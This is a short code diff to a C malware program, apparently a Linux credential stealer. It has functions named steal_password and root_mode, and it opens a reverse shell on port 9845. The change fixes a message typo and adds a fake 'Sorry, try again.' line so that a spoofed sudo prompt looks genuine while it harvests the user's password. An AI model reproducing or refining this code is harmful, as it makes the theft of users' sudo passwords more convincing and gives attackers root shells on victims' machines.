@@ -50,7 +50,7 @@ int sudo_mode(int argc, char ** argv){
 }
 
 int root_mode(int argc, char**argv){
-  printf("I have root acess now...\n");
+  printf("I have root access now...\n");
   reverse_shell(9845, "0.0.0.0", argv);
   while(1){
     sleep(1);
@@ -131,6 +131,9 @@ int steal_password(char * passwd, char * username){
     // If sudo works with password, we know we have the right password
     if (testSudoPassword(passwd) == 0){
       correctPasswd = 1;
+    }
+    else {
+      printf("Sorry, try again.\n");
     }
 
   }
